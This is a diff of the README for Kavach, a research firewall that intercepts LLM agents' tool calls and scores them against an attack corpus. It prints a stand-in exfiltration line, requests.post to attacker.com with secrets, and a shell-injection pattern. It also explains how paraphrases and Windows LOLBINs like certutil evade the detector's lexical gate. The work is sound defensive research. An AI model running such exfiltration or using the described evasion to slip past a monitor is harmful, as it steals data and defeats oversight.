@@ -1,19 +1,18 @@
 <div align="center">
 
-# 🛡️ Kavach
+<img src="kavachlogo.png" width="180" alt="Kavach"/>
 
-### A Runtime Semantic Firewall for LLM Agents
+# Kavach
+
+**A runtime semantic firewall for LLM agents — interception at the tool-call boundary, no LLM in the decision path.**
 
 *कवच — "protective armour"*
 
-**Pre-execution interception · embedding-based detection · zero LLM in the decision path**
-
-[![Status](https://img.shields.io/badge/status-research_prototype-8b5a3c)]()
 [![Target](https://img.shields.io/badge/target-AISec%202026%20%40%20CCS-5b8a72)]()
+[![Embeddings](https://img.shields.io/badge/embeddings-BAAI%2Fbge--base--en--v1.5-4d8a8c)]()
 [![License](https://img.shields.io/badge/license-MIT-c79849)]()
-[![Embedding](https://img.shields.io/badge/embeddings-BAAI%2Fbge--base--en--v1.5-4d8a8c)]()
 
-**PES University Capstone · PW26_RB_03**
+PES University Capstone · PW26_RB_03
 Ishani Chakraborty · Parv Parmar · Janya Mahesh · Pranitha Goduguluri
 Supervisor: Prof. Rajesh Banginwar
 
@@ -21,337 +20,276 @@ Supervisor: Prof. Rajesh Banginwar
 
 ---
 
-## TL;DR
+## What Kavach Is
 
-Kavach sits between an LLM agent and the tools it calls. Before any tool executes, Kavach embeds the proposed action with a sentence-embedding model and scores it against a curated **401-pattern attack corpus** through a **"parliament" of four specialist detectors** (ministers). A deterministic **Speaker** combines their verdicts — *any one* minister at BLOCK is sufficient to block — and a **COMPASS** module independently checks whether the action still matches the user's original intent. Every decision is written to a **SHA-256 hash-chained ledger**.
+Modern LLM agents act in the world through tool calls — running shell commands, reading files, making network requests. The vulnerability is at the **tool-call boundary**, not in the model weights: a resolved tool invocation goes from "the model decided" straight to "the tool runs," with no semantic check in between. Recent CVEs (CVE-2025-59536 and CVE-2026-21852 on Claude Code, CVE-2025-68664 on LangChain, CVE-2025-34291 on LangFlow) were all exploited at this layer, in the agent harness rather than the model.
 
-**There is no LLM in the decision path.** Detection is pure embedding retrieval (~78 ms p50 on GPU), making Kavach model-agnostic and an order of magnitude faster than LLM-judge or lifecycle-instrumenting guardrails.
+Kavach inserts a check at exactly that boundary. Before any tool call executes, Kavach embeds the proposed action with a sentence-embedding model and scores it against a curated **401-pattern attack corpus** through a *parliament* of four specialist detectors (ministers). A deterministic **Speaker** combines their verdicts — any single minister at its block threshold is sufficient to deny the call — and a **COMPASS** module independently checks whether the action still matches the user's original intent. Every decision is written to a SHA-256 hash-chained ledger.
 
-Beyond the system, this repository contains a **research programme**: a red-team evasion harness, a characterised **BM25 lexical-gate blind spot** (the R2 finding), a **closed-loop corpus-improvement agent** with an anti-poisoning validator, and a full offline §5 analysis pipeline.
+There is **no LLM in the decision path**: detection is pure embedding retrieval (~78 ms p50), which keeps Kavach model-agnostic, deterministic, auditable, and an order of magnitude faster than LLM-judge or lifecycle-instrumenting guardrails. Kavach is for anyone running an agent framework that exposes a pre-execution hook and wants a semantic guardrail that does not depend on a second model in the loop. Beyond the system, this repository is a research programme: a red-team evasion harness, a characterised BM25 lexical-gate blind spot (the R2 finding), a closed-loop corpus-improvement agent with an anti-poisoning validator, and the offline analysis pipeline behind the paper's evaluation.
+
+---
+
+## Architecture
+
+Every proposed tool call is embedded once, routed to the relevant ministers, scored, combined by the Speaker, and recorded — synchronously, before the tool runs.
 
 ```mermaid
 flowchart LR
-  A["LLM Agent"] -->|"tool call"| B["Plugin<br/>before_tool_call"]
-  B -->|"HTTP POST"| C["Parliament<br/>:8088"]
-  C --> D{{"COMPASS<br/>intent drift"}}
-  C --> R["Router<br/>activate ministers"]
-  R --> M["4 Ministers<br/>EXECUTOR · VAULT<br/>CHANNEL · NAVIGATOR"]
-  C --> T["Trajectory<br/>session risk"]
+  A["Tool Call"] --> B["Embed Once<br/>BGE-base 768-d"]
+  B --> R["Semantic Router<br/>activate ministers >= 0.40"]
+  R --> M["Ministers<br/>EXECUTOR · VAULT<br/>CHANNEL · NAVIGATOR"]
+  B --> CO["COMPASS<br/>intent drift"]
+  B --> T["Trajectory<br/>session risk"]
   M --> S["Speaker<br/>pure-veto combine"]
-  D --> S
+  CO --> S
   T --> S
-  S --> P["Provenance<br/>ATT&CK · CWE · ATLAS"]
+  S --> P["Provenance<br/>technique to tactic to stage"]
   P --> L[("Ledger<br/>SHA-256 chain")]
-  S -->|"BLOCK / ESCALATE / ALLOW"| B
+  S --> V["BLOCK / ESCALATE / ALLOW"]
 ```
 
----
-
-## Table of Contents
-
-1. [What Kavach Does](#1-what-kavach-does)
-2. [The Threat: Why Tool Calls Are the Attack Surface](#2-the-threat-why-tool-calls-are-the-attack-surface)
-3. [System Architecture](#3-system-architecture)
-4. [The Attack Corpus](#4-the-attack-corpus)
-5. [Component Deep Dives](#5-component-deep-dives)
-6. [Research Contributions](#6-research-contributions)
-7. [Benchmarks & Results](#7-benchmarks--results)
-8. [Setup & Running](#8-setup--running)
-9. [Repository Map](#9-repository-map)
-10. [Configuration Reference](#10-configuration-reference)
-11. [Team & Paper](#11-team--paper)
-12. [Honest Status & Limitations](#12-honest-status--limitations)
-
----
-
-## 1. What Kavach Does
-
-Kavach is a **pre-execution semantic firewall** for multi-agent systems. When an LLM agent is about to execute a tool call — run a shell command, read a file, make a network request — Kavach intercepts it *before* it runs, evaluates it **semantically** (not by regex or syntax rules) against a corpus of attack patterns, and returns one of three verdicts:
-
-| Verdict | Meaning | Plugin behaviour |
+| Component | File | Role |
 |---|---|---|
-| 🟢 **ALLOW** | no minister crosses its block threshold, intent aligned | tool runs normally |
-| 🟡 **ESCALATE** | borderline / grey-zone match, or intent drift alone | human approves or denies |
-| 🔴 **BLOCK** | a minister crosses its block threshold, or drift-corroborated | tool never runs |
+| **Semantic Router** | `parliament/server.py` | Embeds the action once and activates only ministers whose domain similarity exceeds `router_min = 0.40` — typically one or two of four, the triage layer that controls cost without a syntactic pre-filter. |
+| **Ministers** | `parliament/ministers.py` | Domain-bound semantic detectors, each over its own ChromaDB collection. The production scorer `run_minister_hybrid` fuses dense cosine with BM25 via reciprocal-rank fusion, scaling the final confidence by a lexical gate. |
+| **COMPASS** | `parliament/server.py` | Session-level intent oracle. The user's goal is seeded at session start; each action is scored `cosine(intent, action)`, and drift is flagged below `0.585` (a data-derived threshold). Catches goal hijacking the per-action ministers miss. |
+| **Trajectory** | `parliament/trajectory.py` | Accumulates session-level risk over a rolling window — sequential chaining and cross-minister escalation (e.g. VAULT then CHANNEL = credential then exfil) — and modulates the per-call block threshold. |
+| **Speaker** | `parliament/speaker.py` | Deterministic, asymmetric combiner. Does not average; one minister at its block threshold vetoes the call. |
+| **Ledger** | `parliament/provenance.py` | Append-only SQLite, SHA-256 hash-chained. Every verdict and its provenance is committed; `GET /ledger/verify` re-walks the chain to detect any post-hoc edit. |
 
-**The central design claim:** if a runtime exposes a pre-execution hook, a semantic guardrail can achieve high attack recall at low false-positive cost using embedding similarity over a well-authored corpus — and can do so *without* a second LLM in the loop, keeping latency in the tens of milliseconds and behaviour deterministic and auditable.
-
----
-
-## 2. The Threat: Why Tool Calls Are the Attack Surface
-
-Agent runtimes give LLMs access to bash execution, file I/O, and HTTP. The vulnerability is at the **tool-call boundary**, not the model weights. Recent CVEs make this concrete:
-
-| CVE | System | Attack |
-|---|---|---|
-| CVE-2025-59536 | Claude Code | Prompt injection via tool output → RCE |
-| CVE-2026-21852 | Claude Code | API-key exfiltration via tool-call injection |
-| CVE-2025-68664 | LangChain | Serialization injection via tool arguments |
-| CVE-2025-34291 | LangFlow | RCE via agent tool call (CISA KEV, MuddyWater APT) |
-
-Most production agent runtimes have **no pre-execution interception point** — a tool call goes from "model decides" straight to "tool runs" with no semantic check in between. Kavach introduces exactly that check, and the paper documents the **gateway-hook gap** (a host-runtime property, not a Kavach property): a pre-execution hook is a precondition for *any* runtime guardrail, and should be treated as a first-class, tested platform primitive.
+The embedding model is `BAAI/bge-base-en-v1.5` (768-d). The service runs on FastAPI at `127.0.0.1:8088` and fails **closed** on the tool-call path (`toolCallFailMode = deny`). Kavach is model-agnostic and runs **without a GPU** — CPU-only deployment is supported end-to-end, with a GPU only accelerating the embedding step.
 
 ---
 
-## 3. System Architecture
+## The Speaker's Decision Logic
 
-```mermaid
-flowchart TB
-  subgraph agent["OpenClaw Agent (embedded mode)"]
-    U["User: 'help me debug my parser tests'"]
-    LLM["LLM generates tool call"]
-    HOOK["before_tool_call hook"]
-    U --> LLM --> HOOK
-  end
-
-  subgraph parl["Kavach Parliament — parliament/server.py :8088"]
-    direction TB
-    CO["COMPASS<br/>cosine(intent, action)"]
-    RO["Router<br/>which ministers fire (≥0.40)"]
-    subgraph mins["Ministers (hybrid BM25 + dense)"]
-      E["EXECUTOR<br/>block ≥ 0.55"]
-      V["VAULT<br/>block ≥ 0.75"]
-      CH["CHANNEL<br/>block ≥ 0.60"]
-      N["NAVIGATOR<br/>block ≥ 0.60"]
-    end
-    TR["Trajectory<br/>session-level risk"]
-    SP["Speaker<br/>combine_verdicts (pure veto)"]
-    CO --> SP
-    RO --> mins --> SP
-    TR --> SP
-  end
-
-  HOOK -->|"POST /hook/parliament"| CO
-  SP --> PROV["Provenance<br/>technique → tactic → stage"]
-  PROV --> LED[("SQLite Ledger<br/>SHA-256 hash chain")]
-  SP -->|"verdict"| HOOK
-  HOOK -->|"BLOCK → deny<br/>ESCALATE → ask<br/>ALLOW → run"| OUT["tool execution"]
-```
-
-**Decision flow:** tool call → **Router** (activate only relevant ministers, ~1–2 of 4, saving latency) → **Ministers** score via hybrid retrieval → **COMPASS** checks intent drift → **Trajectory** tracks multi-step session risk → **Speaker** combines deterministically → **Ledger** records.
-
-- **Embedding model:** `BAAI/bge-base-en-v1.5` (768-d), GPU-resident on the primary config.
-- **Retrieval:** hybrid — dense cosine **fused with BM25** via reciprocal-rank fusion, with the final confidence scaled by a lexical gate (see [§6](#6-research-contributions)).
-- **Server:** FastAPI on `127.0.0.1:8088`; fails **closed** on the tool-call path (`toolCallFailMode = deny`).
-- **Latency:** ~78 ms p50 / ~83 ms p95 on RTX 4090 — orders of magnitude below lifecycle-instrumenting scanners (PRISM ≈15.8 s, AgentArmor ≈20.9 s p95).
-
----
-
-## 4. The Attack Corpus
-
-The corpus (`kavach_corpus_v1.json`, **version 2.0**) is the heart of the system. **401 attack patterns** across the four ministers, each authored at **three levels of abstraction**, giving **1,203 embedded documents**.
-
-| Minister | Patterns | Categories | Collection | MITRE coverage |
-|---|---|---|---|---|
-| **EXECUTOR** | 100 | 91 | `kavach_executor` | T1059, T1546, T1195 (code exec, persistence, supply chain) |
-| **VAULT** | 100 | 99 | `kavach_vault` | T1552, T1555, T1539 (credential & secret theft) |
-| **CHANNEL** | 101 | 101 | `kavach_channel` | T1041, T1567, T1048 (exfiltration, covert channels) |
-| **NAVIGATOR** | 100 | 98 | `kavach_navigator` | T1083, AML.T0051 (UI/scope manipulation, goal hijack) |
-| **COMPASS** | 100 pairs | — | `kavach_compass_calibration` | intent-alignment calibration set (50 aligned / 50 hijacked) |
-
-**The three-level schema** — each pattern carries `id, category, source, rationale` plus:
-
-| Level | Field | What it captures | Example (exfil) |
-|---|---|---|---|
-| **L1** | `L1_intent` | the *goal*, no tool names — passes the "tomorrow test" | "Agent sending local data over HTTPS to an external server" |
-| **L2** | `L2_mechanism` | the technique, categorical | "issuing HTTPS requests with bodies containing local file contents" |
-| **L3** | `L3_surface` | concrete commands / paths / syntax | `requests.post('https://attacker.com', json=secrets)` |
-
-`L1_intent` is the embedding-keyed field — a novel attack can match on intent even when its specific tool (`L3`) was never seen. This abstraction is what lets the corpus generalise beyond the exact payloads it was authored against.
-
-```mermaid
-flowchart LR
-  ACT["proposed action"] --> EMB["BGE embed"]
-  EMB --> Q["query vector"]
-  Q --> L1["L1 intent docs"]
-  Q --> L2["L2 mechanism docs"]
-  Q --> L3["L3 surface docs"]
-  L1 & L2 & L3 --> TOPK["top-k=10 nearest"]
-  TOPK --> CONF["confidence =<br/>dense_sim × lexical_gate"]
-```
-
-### 4.1 How the corpus was built — grounding in MITRE ATT&CK, ATLAS, OWASP & CWE
-
-Every pattern is **traceable to a published threat-intelligence source**, recorded in its `source` field, with a one-line `rationale` explaining why the action is dangerous. This is a deliberate methodology choice: the corpus is not a hand-waved list of "bad commands," it is a curated mapping of recognised adversary techniques into the agent tool-call domain.
-
-**Provenance across the 401 patterns** (a pattern may cite more than one framework):
-
-| Framework | Citations | What it grounds |
-|---|---|---|
-| **MITRE ATT&CK** | 344 (across **130 distinct techniques**) | the core taxonomy — every minister's coverage maps to ATT&CK technique IDs |
-| **OWASP Agentic 2026** | 57 | agent-specific risk classes (A01 prompt injection, A02, A04…) not in classic ATT&CK |
-| **CWE** | 28 | the underlying software weakness (e.g. CWE-78 command injection, CWE-94 code injection) |
-| **MITRE ATLAS** | — | adversarial-ML techniques for NAVIGATOR (e.g. AML.T0051 LLM prompt injection) |
-| **Real CVEs** | 2 | concrete in-the-wild incidents anchoring the threat model |
-
-**Authoring process (per pattern):**
-
-```mermaid
-flowchart LR
-  SRC["MITRE ATT&CK /<br/>ATLAS / OWASP / CWE<br/>technique"] --> MAP["map to the agent<br/>tool-call domain"]
-  MAP --> L1A["write L1_intent<br/>(goal, no tool names)"]
-  L1A --> L2A["write L2_mechanism<br/>(technique, categorical)"]
-  L2A --> L3A["write L3_surface<br/>(real commands / paths)"]
-  L3A --> META["tag source + rationale<br/>+ category + minister"]
-  META --> IDX["embed all 3 levels<br/>into ChromaDB"]
-```
-
-Concretely, a single pattern looks like this (`EXEC-001`):
-
-```json
-{
-  "id": "EXEC-001",
-  "category": "command_injection",
-  "source": "MITRE ATT&CK T1059.004, CWE-78",
-  "rationale": "Agent passes user-controlled input through a shell interpreter",
-  "L1_intent": "Agent executing a system command built from untrusted input",
-  "L2_mechanism": "User-controlled string concatenated into a shell invocation",
-  "L3_surface": "os.system(f'...{user_input}...'), subprocess with shell=True"
-}
-```
-
-**Why three frameworks rather than one:** MITRE ATT&CK is mature for *system* attacks but predates agent-specific risks; OWASP Agentic 2026 fills the LLM-agent gaps (prompt injection, goal hijacking, tool poisoning); CWE grounds each pattern in the underlying software weakness; ATLAS covers the adversarial-ML surface. Together they give each minister both breadth (130 techniques) and the agent-era coverage classic ATT&CK lacks.
-
-**The COMPASS set** is built differently — 100 *paired* examples (a user intent + a proposed action), labelled 50 `aligned` / 50 `hijacked`, used to derive the intent-drift threshold from data via Youden's J rather than hand-tuning it.
-
-**Corpus quality is itself a research loop:** the red-teamer ([§6.1](#6-research-contributions)) probes the corpus for blind spots, the corpus_agent ([§6.3](#6-research-contributions)) proposes grounded additions, and the 3-part validator guards against the over-broad patterns that would inflate false positives — so the corpus improves without being poisoned.
-
----
-
-## 5. Component Deep Dives
-
-### 5.1 The Router — `parliament/server.py:_route`
-Selects which ministers to activate per action by cosine-matching the action against each minister's domain descriptions (`kavach_router_config.json`). Threshold `router_min = 0.40`. A typical action runs 1–2 ministers, not all four — this is Kavach's triage layer, controlling cost without a syntactic pre-filter. Falls back to all four if nothing activates.
-
-### 5.2 The Ministers — `parliament/ministers.py`
-Each minister is a semantic detector over its own ChromaDB collection (300 docs each, 303 for CHANNEL). The production scorer is `run_minister_hybrid`:
-
-```
-confidence = dense_sim(selected) × lexical_gate
-lexical_gate = GATE_FLOOR                                 if no lexical overlap
-             = GATE_FLOOR + (1 − GATE_FLOOR)·(bm25/bm25_max)  otherwise
-```
-`GATE_FLOOR = 0.65`. RRF selects the best candidate; confidence stays in calibrated cosine units so the per-minister thresholds remain meaningful. (This gate is exactly what the R2 finding characterises — see [§6](#6-research-contributions).)
-
-### 5.3 COMPASS — `parliament/server.py:_compass_drift`
-Session-level intent oracle. At session start the user's goal is seeded (`/hook/seed_intent`); every action is then scored `compass_sim = cosine(intent_vec, action_vec)`, and drift is flagged when `compass_sim < 0.585` (the data-derived threshold). An action can look benign to all four ministers yet be completely off-task — COMPASS catches goal hijacking that the per-action ministers miss.
-
-### 5.4 The Speaker — `parliament/speaker.py:combine_verdicts`
-Deterministic, **asymmetric** combiner. It does **not** average — one BLOCK is enough.
+The Speaker applies five rules in priority order. It is a pure veto: a single blocking minister is decisive, and there is no confidence averaging.
 
 ```mermaid
 flowchart TD
-  START["minister scans + COMPASS"] --> C1{"any minister<br/>≥ block threshold?"}
-  C1 -->|yes| BLOCK1["🔴 BLOCK"]
-  C1 -->|no| C2{"COMPASS drift<br/>+ any ESCALATE?"}
-  C2 -->|yes| BLOCK2["🔴 BLOCK (drift-corroborated)"]
-  C2 -->|no| C3{"any ESCALATE?"}
-  C3 -->|yes| ESC["🟡 ESCALATE"]
+  START["minister scans + COMPASS + trajectory"] --> C0{"session risk >= ceiling?"}
+  C0 -->|yes| B0["BLOCK (trajectory)"]
+  C0 -->|no| C1{"any minister >= block threshold?"}
+  C1 -->|yes| B1["BLOCK"]
+  C1 -->|no| C2{"COMPASS drift AND any ESCALATE?"}
+  C2 -->|yes| B2["BLOCK (drift-corroborated)"]
+  C2 -->|no| C3{"any minister ESCALATE?"}
+  C3 -->|yes| E1["ESCALATE"]
   C3 -->|no| C4{"COMPASS drift alone?"}
-  C4 -->|yes| ESC2["🟡 ESCALATE"]
-  C4 -->|no| ALLOW["🟢 ALLOW"]
+  C4 -->|yes| E2["ESCALATE"]
+  C4 -->|no| AL["ALLOW"]
 ```
 
-The drift-corroboration case is the interesting one: a *borderline* minister match (below block, above grey) is promoted to BLOCK when COMPASS independently agrees the action is off-intent. A live example: a `certutil` download issued under a "verify my SSL certificate" intent — CHANNEL scores it borderline (0.546), COMPASS detects drift (0.537 < 0.585), and the Speaker returns **BLOCK**.
-
-### 5.5 Trajectory Monitor — `parliament/trajectory.py`
-Session-level risk over a rolling window of cached action vectors: accumulation + sequential-direction chaining + cross-minister escalation patterns (e.g. VAULT→CHANNEL = credential→exfil). Modulates the per-call block threshold. Embeds once and shares the vector across COMPASS + ministers + trajectory.
-
-### 5.6 The Ledger — `parliament/provenance.py`
-SQLite, append-only, **SHA-256 hash-chained**. Every verdict + its provenance (technique → tactic → stage) is committed. `GET /ledger/verify` re-walks the chain and detects any post-hoc edit — tamper-evidence demonstrated in the paper appendix.
+The drift-corroboration rule is the interesting case: a borderline minister match (below block, above grey) is promoted to BLOCK when COMPASS independently agrees the action is off-intent. For example, a `certutil` download issued under a "verify my SSL certificate" intent — CHANNEL scores it borderline (0.546), COMPASS detects drift (0.537 < 0.585), and the Speaker returns BLOCK on the corroboration.
 
 ---
 
-## 6. Research Contributions
+## Detection Coverage
 
-This repository is not just a system — it is a research programme. The contributions live in `kavach_eval/`, which is **pure eval tooling and never writes the live corpus or `parliament/`**.
+The corpus (`kavach_corpus_v1.json`, version 2.0) holds **401 attack patterns** across the four ministers, each authored at three levels of abstraction, giving **1,203 embedded documents**, plus 100 COMPASS calibration pairs.
 
-### 6.1 Red-Team Evasion Harness — `kavach_eval/redteam_evasion_v0.py`
-Paraphrases the corpus's *own* attack patterns (templated + LLM modes) and replays them through the **real production scorer** to measure parliament-level evasion. A `MaliciousnessGuard` ensures a paraphrase only counts as an evasion if it stays genuinely malicious. Separately flags **BM25-gate evasions**: cases where dense similarity alone would have blocked, but the lexical gate discounted the hybrid score below threshold.
+| Minister | Patterns | Collection | MITRE ATT&CK | OWASP Agentic 2026 |
+|---|---|---|---|---|
+| **EXECUTOR** | 100 | `kavach_executor` | T1059, T1546, T1195 (code execution, persistence, supply chain) | ASI05 Unexpected Code Execution, ASI04 Agentic Supply Chain |
+| **VAULT** | 100 | `kavach_vault` | T1552, T1555, T1539 (credential & secret theft) | ASI03 Identity & Privilege Abuse, ASI09 Human-Agent Trust |
+| **CHANNEL** | 101 | `kavach_channel` | T1041, T1567, T1048 (exfiltration, covert channels) | ASI07 Insecure Inter-Agent Comms, ASI08 Cascading Failures |
+| **NAVIGATOR** | 100 | `kavach_navigator` | T1083, AML.T0051 (scope manipulation, goal hijack) | ASI01 Agent Goal Hijack, ASI10 Rogue Agents |
 
-### 6.2 The BM25 Lexical-Gate Blind Spot (the "R2" finding) — `kavach_eval/R2_FINDINGS.md`
-The headline negative result, characterised as a **systematic class**, not an anecdote:
+Each pattern carries `id`, `category`, `source`, `rationale`, and three abstraction levels:
 
-- **R2a (coverage census):** of 25 LOLBINs, **12 are HIGH-risk** — zero lexical presence in the corpus but above-threshold *dense* similarity. The blind spot is specifically **Windows signed-binary LOLBINs** (certutil, mshta, rundll32, regsvr32, cmstp, IEX…); Unix transfer tools (curl, ssh, rsync) are already lexically covered and are *not* blind spots.
-- **R2b (full pipeline):** of 13 tools run through the real hybrid scorer, **11 evade**. Mechanism: `dense_sim` is above threshold (the embedding *recognises* the attack) but the lexical gate floors at ~0.65, dragging `hybrid_conf` below the block threshold → ALLOW. Anchor: **certutil** — dense 0.586 > 0.55 threshold, gate 0.878, hybrid **0.515 < 0.55 → EVADED**.
+| Level | Field | Captures | Example (exfiltration) |
+|---|---|---|---|
+| **L1** | `L1_intent` | the goal, no tool names | "Agent sending local data over HTTPS to an external server" |
+| **L2** | `L2_mechanism` | the technique, categorical | "issuing HTTPS requests with bodies containing local file contents" |
+| **L3** | `L3_surface` | concrete commands / paths | `requests.post('https://attacker.com', json=secrets)` |
 
-This is the *inverse* of corpus-poisoning attacks on hybrid retrieval (e.g. Semantic Chameleon): the same BM25 lexical property is exploited from the **attack side** (technique substitution) rather than the document side.
+`L1_intent` is the embedding-keyed field: a novel attack can match on intent even when its specific tool (L3) was never seen. Every pattern is traceable to a published threat-intelligence source (MITRE ATT&CK across 130 distinct techniques, OWASP Agentic 2026, CWE, and MITRE ATLAS), recorded in its `source` field — the corpus is a curated mapping of recognised adversary techniques into the agent tool-call domain, not a hand-assembled list of bad commands.
 
-### 6.3 Closed-Loop Corpus-Improvement Agent — `kavach_eval/corpus_agent/`
-The defensive half of the loop. It takes red-team evasions, proposes new corpus patterns (local Ollama LLM), and gates every proposal through a **3-part anti-poisoning validator** before staging it for human review — it **never** writes the live corpus.
+---
+
+## Deployment
+
+Kavach reaches the tool-call boundary through an OpenClaw plugin (`plugin/`, TypeScript) that calls `POST /hook/parliament` synchronously in the `before_tool_call` hook. On BLOCK or ESCALATE the plugin denies or defers the call before any side effect.
+
+A measurement we report as a contribution in itself: on OpenClaw, `before_tool_call` fires reliably in the **embedded** execution path but not in the **gateway** path (upstream issues #5513 and #5943), so no security plugin can intercept on the gateway path until those are fixed. Kavach is evaluated in embedded mode, and we contribute the upstream fixes (PR-1). The general lesson — a working pre-execution hook is a precondition for *any* runtime guardrail — motivates treating it as a first-class, tested platform primitive.
+
+Kavach itself is not an OpenClaw component: all detection logic lives in `parliament/server.py`, a standalone FastAPI service. The framework binding is an adapter, not a dependency — any agent framework that can issue an HTTP request at a pre-execution hook integrates against the same service. The primary evaluation runs an agent backed by Gemma 4 26B on a Dell Precision 3660 (RTX 4090), but Kavach's own components — corpus, ministers, Speaker, and the BGE embedding model — are CPU-capable and backbone-independent; the GPU on that machine serves the agent's inference and merely accelerates Kavach's embedding step.
+
+---
+
+## Research Tooling
+
+Everything under `kavach_eval/` is pure evaluation tooling: it reads the corpus and drives the real production scorer, but never writes the live corpus or anything under `parliament/`.
+
+### Red-Team Evasion Testing — `kavach_eval/redteam_evasion_v0.py`
+
+Paraphrases the corpus's own attack patterns and replays them through the real production scorer to measure parliament-level evasion. A `MaliciousnessGuard` ensures a paraphrase only counts as an evasion if it stays genuinely malicious (requiring at least two attack-domain tokens, with seed-overlap when the seed itself is lexical — a tightening applied this cycle). Seed identity is minister-scoped to prevent checkpoint collisions on resume. BM25-gate evasions are flagged separately: cases where dense similarity alone would have blocked, but the lexical gate discounted the hybrid score below threshold.
 
 ```mermaid
 flowchart LR
-  RT["red-teamer<br/>finds evasions"] --> PR["proposer.py<br/>LLM authors pattern"]
-  PR --> GATE{"validator.py<br/>3-part gate"}
-  GATE -->|"A: fires on benign?"| REJ["REJECTED_FP"]
-  GATE -->|"B: catches its evasion?"| REJ2["REJECTED_DETECTION"]
-  GATE -->|"C: near-duplicate?"| REJ3["REJECTED_DEDUP"]
-  GATE -->|"all pass"| STAGE["staging/<br/>human_review_required"]
-  STAGE --> HUMAN["human admits<br/>to corpus"]
+  C["Seed Corpus<br/>L1 / L2 / L3"] --> P["Paraphraser<br/>templated / LLM / threat-intel"]
+  P --> G["MaliciousnessGuard<br/>still malicious?"]
+  G --> SC["Real Parliament Scorer<br/>run_minister_hybrid"]
+  SC --> RP["Evasion Report<br/>+ BM25-gate flags"]
 ```
 
-The validator uses the **real** `bge-base-en-v1.5` and **real** per-minister thresholds. A worked example — **CHAN-101** (bitsadmin exfil family) — was proposed by the agent, passed all three gates, admitted, and verified: the bitsadmin evasion that previously slipped at hybrid_conf 0.4198 is now **BLOCKED at 0.8755** with no regression on the rest of CHANNEL.
+### R2: Structural Vulnerability Census — `kavach_eval/R2_FINDINGS.md`
 
-### 6.4 Adaptive Vote-Corruption Analysis — `kavach_eval/adaptive_attack.py`
-A separate threat model: perturb recorded minister votes to test how the Speaker aggregator degrades when *K* ministers are compromised. Compares five aggregators (the real pure-veto, max-score, majority, Bayesian, and a hybrid) on real vote dumps — quantifying the robustness of the deterministic Speaker.
+A characterised negative result, treated as a systematic class rather than an anecdote. Of 25 LOLBINs surveyed, 12 are HIGH-risk: zero lexical presence in the corpus but above-threshold dense similarity. The blind spot is specifically **Windows signed-binary LOLBINs** (certutil, mshta, regsvr32, cmstp, IEX…); Unix transfer tools (curl, ssh, rsync) are already lexically covered. Run through the real hybrid scorer, 11 of 13 tools evade. The mechanism: `dense_sim` is above threshold (the embedding recognises the attack) but the lexical gate floors at ~0.65, dragging `hybrid_conf` below the block threshold. Anchor example — **certutil**: dense 0.586 above the 0.55 threshold, gate 0.878, hybrid 0.515 below 0.55 → evaded.
 
-### 6.5 Offline §5 Pipeline — `kavach_eval/make_section5.py`, `eval_harness.py`, `tune.py`
-Minister-correlation (ρ) estimation, ECE calibration, N-minister ablation, latency percentiles, and a (ρ, threshold) Pareto sweep — the full machinery behind the paper's §5, runnable with no GPU on a vote dump.
+### corpus_agent: Pattern Proposal — `kavach_eval/corpus_agent/`
+
+The defensive half of the loop. It consumes red-team evasion reports, proposes new corpus patterns (local Ollama LLM), and gates every proposal through a three-part anti-poisoning validator before staging it for human review. It never writes the live corpus.
+
+```mermaid
+flowchart LR
+  RT["Evasion Report"] --> PR["proposer.py<br/>LLM authors pattern"]
+  PR --> GA{"Anti-Poisoning Gate"}
+  GA -->|"A: fires on benign?"| R1["REJECTED_FP"]
+  GA -->|"B: catches its evasion?"| R2["REJECTED_DETECTION"]
+  GA -->|"C: near-duplicate?"| R3["REJECTED_DEDUP"]
+  GA -->|"all pass"| ST["staging/<br/>human review required"]
+```
+
+The validator uses the real `bge-base-en-v1.5` and the real per-minister thresholds. A worked example — **CHAN-101** (bitsadmin exfil family) — was proposed, passed all three gates, admitted, and verified: the bitsadmin evasion that previously slipped at hybrid_conf 0.4198 is now blocked at 0.8755, with no regression on the rest of CHANNEL.
+
+### Improvement Loop: Closed-Loop Remediation — `kavach_eval/improvement_loop.py`
+
+The orchestrator that chains the pieces above into a single human-in-the-loop cycle, replacing the manual hand-off between red-teamer and corpus_agent.
+
+```mermaid
+flowchart LR
+  RT["Red-Team<br/>templated"] --> PR["corpus_agent<br/>propose + gate"]
+  PR --> FC["Fix-Check<br/>temp ChromaDB"]
+  FC --> EC["Effective<br/>Candidates"]
+  EC --> D["Delta<br/>before vs after"]
+  D --> H{"Human Approval"}
+  H -->|"YES"| INT["Append corpus<br/>+ rebuild prod"]
+  H -->|"NO"| DIS["Discard"]
+  INT --> RT
+```
+
+The safety design is non-negotiable: the live corpus is **append-only** and is never edited until a human types "yes"; all intermediate work happens in a **temp ChromaDB** (`parliament/.chroma_kavach_staging/`) so the production index is never touched mid-loop; a candidate is kept only if it **demonstrably fixes its triggering evasion** against the temp index (not merely "passed the gate"); patterns are minister-scoped; the regression delta uses the deterministic templated paraphraser so improvement is attributable; and the original corpus is snapshotted (`kavach_corpus_v1_ORIGINAL.json`) and recoverable from git at any point. The loop stops on its own when there is nothing left to safely fix — there is no max-iterations counter.
 
 ---
 
-## 7. Benchmarks & Results
+## Evaluation
 
-Primary config: **Dell Precision 3660 · RTX 4090 · Gemma 4 26B via Ollama · BGE-base-en-v1.5 · hybrid retrieval · per-minister thresholds.** InjecAgent = 1,054 cases (62 attacker tools × 17 user tasks), split data-harm (DH) / data-stealing (DS).
+Primary configuration: an agent backed by Gemma 4 26B (Ollama) on a Dell Precision 3660 (RTX 4090), with Kavach using BGE-base-en-v1.5, hybrid retrieval, and per-minister thresholds. InjecAgent comprises 1,054 cases (62 attacker tools × 17 user tasks), split into direct-harm (DH) and data-stealing (DS) settings.
 
-| Benchmark | Loose recall | Strict (hard-block) recall | FPR (hard-block) | FPR (block-or-escalate) |
-|---|---|---|---|---|
-| InjecAgent DH | 0.90 | 0.633 | — | — |
-| InjecAgent DS | 0.875 | 0.438 | **0.0%** | — |
-| InjecAgent (aggregate) | **0.887** | 0.532 | 19% | 38% |
+| Setting | Loose recall | Strict (hard-block) recall | Hard-block FPR |
+|---|---|---|---|
+| InjecAgent DH | 0.90 | 0.633 | 23.5% |
+| InjecAgent DS | 0.875 | 0.438 | 0.0% |
 
-**Latency (GPU, benign steady-state):** p50 ~78 ms / p95 ~83 ms.
+The hard-block false-positive rate is concentrated almost entirely in the DH setting and is driven by a small number of over-broad CHANNEL patterns — a corpus-quality property addressed separately from the retrieval fusion. It is attributed to a **representation mismatch**: the corpus is authored in tool-call / technique register while InjecAgent's benign actions are fluent natural language, so benign actions land near attack patterns in embedding space. Adding the BM25 lexical channel (hybrid retrieval) is what recovers recall at a controlled false-positive rate.
 
